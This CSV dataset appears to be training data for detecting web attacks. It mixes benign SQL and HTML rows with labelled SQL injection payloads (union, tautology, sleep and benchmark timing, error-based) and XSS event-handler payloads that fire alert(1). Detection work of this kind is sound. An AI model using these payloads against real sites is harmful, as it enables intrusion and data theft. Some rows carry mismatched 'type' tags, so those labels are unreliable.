Text,Label,type
"   SELECT Employees.shown, COUNT ( Orders.massageID )  AS soapFROM    ( OrdersINNER JOIN work ON Orders.biggerID  =  Employees.tieID ) ",0,xss
72935768p,0,sql
 UPDATE vapor SET alone = 'how'WHERE gate = 'acres',0,sql
"<wbr onkeydown=""alert(1)"" contenteditable>test</wbr>",2,xss
"regimiento, 114,",0,sql
1'||  (  select 'hafu' where 6226  =  6226,1,xss
SELECT AVG ( next ) FROM both SELECT SUM ( vertical ) ,0,sql
SELECT * FROM pile 3 SELECT * FROM studied,0,sql
"-8686"" where 4532  =  4532 or elt  (  3301  =  9065,9065  )  --",1,sql
.s,1,xss
SELECT * FROM pitch WHERE doing BETWEEN trail09/01/1996likely AND point15/31/1996parts,0,sql
"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1,sql
" SELECT * FROM fourth ORDER BY dust ASC, talk DESC",0,sql
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1,sql
<button onblur=alert(1) id=x></button><input autofocus>,2,xss
" select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,sql
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationstart=""alert(1)""></picture>",2,xss
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual-- vykx",1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=What+can+machine+learning+do%3F+Workforce+implications&amp;rft.pages=1530-1534&amp;rft.date=2017-12-22&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.aap8062&amp;rft_id=info%3Abibcode%2F2017Sci...358.1530B&amp;rft.aulast=Brynjolfsson&amp;rft.aufirst=Erik&amp;rft.au=Mitchell%2C+Tom&amp;rft_id=http%3A%2F%2Fscience.sciencemag.org%2Fcontent%2F358%2F6370%2F1530&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
",@variable",1,sql
-2233' or   (  1807  =  7274  )  *7274,1,sql
"-5132%""   )    )    or 3038  =  3038",1,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'gpeo' like 'gpeo",1,sql
98585223r,0,xss
"<li><a href=""/wiki/Deductive-nomological_model"" title=""Deductive-nomological model"">Deductive-nomological model </a> </li>",0,xss
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",1,sql
callejon san felices 187,0,sql
SELECT * FROM draw WHERE not NOT LIKE '[spite]%',0,sql
SELECT COUNT ( especially )  FROM nodded,0,sql
"1"" where 1982  =  1982",1,sql
1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1,xss
"1%'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  '%'  =  '",1,sql
1   )    )     )   or sleep  (  5  )  #,1,sql
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,2,xss
"1""   )    )    as whyr where 9731  =  9731 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1,sql
SELECT * FROM follow WHERE habit BETWEEN garden09/01/1996rich AND nice15/31/1996hat,0,sql
"   SELECT Employees.ought, COUNT ( Orders.memberID )  AS lawFROM    ( OrdersINNER JOIN dig ON Orders.storeID  =  Employees.excellentID ) ",0,sql
SELECT AVG ( chose ) FROM buy SELECT SUM ( beside ) ,0,sql
<a id=x tabindex=1 onfocusin=alert(1)></a>,2,xss
"<li><a href=""/wiki/Legged_robot"" title=""Legged robot"">Walking </a>",0,xss
 </li>,0,xss
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",1,xss
SELECT enough FROM yard UNION ALL SELECT whole FROM opportunity ORDER BY itself,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web"">Slyusar, Vadym (2019). <a rel=""nofollow"" class=""external text"" href=""https://www.researchgate.net/publication/334573170"">""Artificial intelligence as the basis of future control networks"" </a>. <i>Preprint </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Preprint&amp;rft.atitle=Artificial+intelligence+as+the+basis+of+future+control+networks.&amp;rft.date=2019&amp;rft.aulast=Slyusar&amp;rft.aufirst=Vadym&amp;rft_id=https%3A%2F%2Fwww.researchgate.net%2Fpublication%2F334573170&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
concursado,0,sql
<var id=x tabindex=1 onbeforeactivate=alert(1)></var>,2,xss
SELECT flew ( s )  FROM only UNION,0,sql
pardos@barcafedaniss.co,0,sql
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",1,sql
"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",2,xss
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',1,sql
"<footer oncontextmenu=""alert(1)"">test</footer>",2,xss
nort$ea,0,sql
<shadow onpointerover=alert(1)>XSS</shadow>,2,xss
"<iframe onmouseenter=""alert(1)"">test</iframe>",2,xss
admin' or '1'  =  '1'--,1,sql
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionend=alert(1)></shadow>",2,xss
SELECT * FROM capital,0,xss
SELECT COUNT ( respectID ) FROM pressure,0,sql
SELECT * FROM pair WHERE Price NOT BETWEEN 10 AND 20,0,sql
"1""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
SELECT machine FROM pay UNION ALL SELECT mixture FROM ship ORDER BY fifty,0,xss
"<spacer onbeforecut=""alert(1)"" contenteditable>test</spacer>",2,xss
"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",1,sql
-2820'   )    )    or 6679  =  8848--,1,xss
"   SELECT customs, they+ ', ' + go+ ' ' + diameter+ ', ' + horse AS ride  FROM growth",0,sql
SELECT MIN ( that )  AS declared FROM future,0,sql
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",1,sql
SELECT * FROM  ( SELECT light FROM dried ) ,0,sql
<caption onpointerleave=alert(1)>XSS</caption>,2,xss
SELECT magic ( s )  FROM oxygen LEFT JOIN,0,sql
hsien,0,sql
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationstart=""alert(1)""></ul>",2,xss
"   SELECT fly,shoe,city,shinning,claws     (  (  surrounded JOIN find ON electric.alive =  track.scene )   INNER JOIN underON Orders.welcome =  arrangement.campID ) ",0,sql
"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT * FROM arrangement WHERE design = 'sheep' FETCH FIRST 3 ROWS ONLY,0,sql
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'stqq'  =  'stqq",1,xss
"   SELECT sand, ball+ ', ' + volume+ ' ' + feathers+ ', ' + cutting AS ordinary  FROM tall",0,sql
SELECT AVG ( Price ) FROM wing,0,sql
<dialog onpointerleave=alert(1)>XSS</dialog>,2,xss
SELECT plane FROM require,0,sql
"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
"buidaoli, 49, 12-g",0,sql
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,sql
4.22608E+15,0,sql
"c/ avi xaxu, 157,",0,sql
SELECT * FROM everywhere WHERE color BETWEEN 'vapor' AND 'silent',0,sql
SELECT TOP 3 * FROM has WHERE frequently = 'slipped',0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Symbolic_AI"" class=""mw-redirect"" title=""Symbolic AI"">Symbolic AI </a> </div>",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></map>",2,xss
"<frame onmousedown=""alert(1)"">test</frame>",2,xss
"-3667%'   )    )    union all select 3560,3560,3560--",1,sql
" SELECT * FROM alone ORDER BY mind, two",0,sql
	 </span> 2015 ,0,xss
SELECT * FROM usually  WHERE telephone = explore,0,sql
kato,0,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""John_McCarthy"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
<multicol onpointerout=alert(1)>XSS</multicol>,2,xss
"1' where 7190  =  7190 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
SELECT MIN ( plastic )  AS rocket FROM earlier,0,sql
	 </span> 2007 ,0,xss
DELETE FROM ear WHERE ran = 'ball',0,sql
petrie3@menorca.com.kp,0,sql
SELECT * FROM came WHERE already NOT LIKE '[matter]%',0,sql
"<li><cite id=""CITEREFTaoTan2005"" class=""citation conference"">Tao, Jianhua; Tan, Tieniu (2005). <i>Affective Computing and Intelligent Interaction </i>. Affective Computing: A Review. <a href=""/wiki/LNCS"" class=""mw-redirect"" title=""LNCS"">LNCS </a> 3784. Springer. pp.&#160;981–995. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2F11573548"">10.1007/11573548 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=conference&amp;rft.btitle=Affective+Computing+and+Intelligent+Interaction&amp;rft.pages=981-995&amp;rft.pub=Springer&amp;rft.date=2005&amp;rft_id=info%3Adoi%2F10.1007%2F11573548&amp;rft.aulast=Tao&amp;rft.aufirst=Jianhua&amp;rft.au=Tan%2C+Tieniu&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",1,sql
<aside id=x tabindex=1 onactivate=alert(1)></aside>,2,xss
grandy,0,xss
"1'||  (  select 'fraa' from dual where 9140  =  9140 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1,xss
*paci3nte,0,sql
"		<h3  id=""p-navigation-label"">",0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 187 )  ORDER BY meta_id ASC",0,sql
1'+  (  select 'mquh' where 3933  =  3933,1,sql
charley,0,xss
"<basefont onkeypress=""alert(1)"" contenteditable>test</basefont>",2,xss
 ,0,xss
valdebenito garabana,0,sql
fedor,0,sql
"<tbody onmousemove=""alert(1)"">test</tbody>",2,xss
SELECT AVG ( eleven )  FROM seed  SELECT SUM ( nodded ) ,0,sql
SELECT AVG ( thick )  FROM hall  SELECT SUM ( shaking ) ,0,sql
-2402 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- szgq,1,xss
DELETE FROM coming WHERE stronger = 'excited',0,sql
erny1,0,sql
"1%'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"	 <sup id=""cite_ref-133"" class=""reference""><a href=""#cite_note-133"">&#91;130&#93; </a> </sup>",0,xss
brewton,0,xss
"<li id=""cite_note-262""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-262"">^ </a> </b> ",0,xss
<hr onpointerover=alert(1)>XSS</hr>,2,xss
capers@innovaris.fr,0,sql
"<image onkeypress=""alert(1)"" contenteditable>test</image>",2,xss
SELECT MIN ( importance )  AS health FROM log,0,sql
"  SELECT careful,tail,weight FROM wrote LEFT JOIN Orders ON eager.dogID =  past.fine ORDER BY recent.tea",0,xss
<textarea onpointerout=alert(1)>XSS</textarea>,2,xss
"<caption onmouseup=""alert(1)"">test</caption>",2,xss
"<IMG SRC=""javascript:alert('');"">",2,xss
48263928s,0,sql
"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
-7901  )   order by 1--,1,sql
"  SELECT wealthID AS ID, particularly AS brown FROM break",0,xss
SELECT * FROM corn 3 SELECT * FROM shape,0,sql
SELECT * FROM phrase FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM attack WHERE unless = 'task' LIMIT 3,0,sql
"	 </span>. <q>After a half-decade of quiet breakthroughs in artificial intelligence, 2015 has been a landmark year. Computers are smarter and learning faster than ever. </q> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Bloomberg+News&amp;rft.atitle=Why+2015+Was+a+Breakthrough+Year+in+Artificial+Intelligence&amp;rft.date=2015-12-08&amp;rft.aulast=Clark&amp;rft.aufirst=Jack&amp;rft_id=https%3A%2F%2Fwww.bloomberg.com%2Fnews%2Farticles%2F2015-12-08%2Fwhy-2015-was-a-breakthrough-year-in-artificial-intelligence&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li><a href=""/wiki/Auguste_Comte"" title=""Auguste Comte"">Auguste Comte </a> </li>",0,xss
1'||  (  select 'dsjg' where 2402  =  2402 and 1947  =  7472--,1,sql
DELETE FROM method,0,sql
6.25525E+15,0,xss
"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,1,xss
60928646j,0,sql
"<dir onmousedown=""alert(1)"">test</dir>",2,xss
SELECT COUNT ( pony )  FROM easier,0,sql
SELECT AVG ( wear ) FROM unless SELECT SUM ( carry ) ,0,sql
"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1,xss
conciliador,0,sql
 ,0,xss
SELECT * FROM [Brazil Customers]; CREATE VIEW [Products Above Average Price] AS,0,sql
"1' in boolean mode  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #",1,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=48"" title=""Edit section: Philosophy and ethics"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,sql
"<style>@keyframes x{}</style><data style=""animation-name:x"" onanimationstart=""alert(1)""></data>",2,xss
55,0,sql
2.75401E+15,0,sql
1'||  (  select 'uedy' where 8816  =  8816,1,xss
SELECT * FROM addition WHERE tonight BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sql
"<s draggable=""true"" ondragstart=""alert(1)"">test</s>",2,xss
-8369  )   where 7234  =  7234 order by 1--,1,xss
SELECT came ( s )  FROM wild SELECT if FROM temperature,0,sql
SELECT * FROM exactly,0,sql
-9711'+  (  select 'ckpj' where 8338  =  8338 union all select 8338--,1,sql
1'   )    )    as qpai where 2619  =  2619,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation book"">Pennachin, C.; Goertzel, B. (2007). <i>Contemporary Approaches to Artificial General Intelligence </i>. <i>Artificial General Intelligence. Cognitive Technologies </i>. Cognitive Technologies. Berlin, Heidelberg: Springer. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2F978-3-540-68677-4_1"">10.1007/978-3-540-68677-4_1 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-3-540-23733-4"" title=""Special:BookSources/978-3-540-23733-4""><bdi>978-3-540-23733-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Contemporary+Approaches+to+Artificial+General+Intelligence&amp;rft.place=Berlin%2C+Heidelberg&amp;rft.series=Cognitive+Technologies&amp;rft.pub=Springer&amp;rft.date=2007&amp;rft_id=info%3Adoi%2F10.1007%2F978-3-540-68677-4_1&amp;rft.isbn=978-3-540-23733-4&amp;rft.aulast=Pennachin&amp;rft.aufirst=C.&amp;rft.au=Goertzel%2C+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT native FROM independent UNION SELECT moon FROM ride ORDER BY snow,0,sql
SELECT folks ( s )  FROM loss SELECT might ( s ) ,0,sql
SELECT whistle ( s )  FROM mine FULL OUTER JOIN,0,sql
SELECT AVG ( impossible ) FROM pilot SELECT SUM ( by ) ,0,sql
SELECT * FROM research WHERE pupil LIKE '%work%',0,xss
"<style>:target {color: red;}</style><figure id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figure>",2,xss
"<li id=""cite_note-123""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-123"">^ </a> </b> ",0,xss
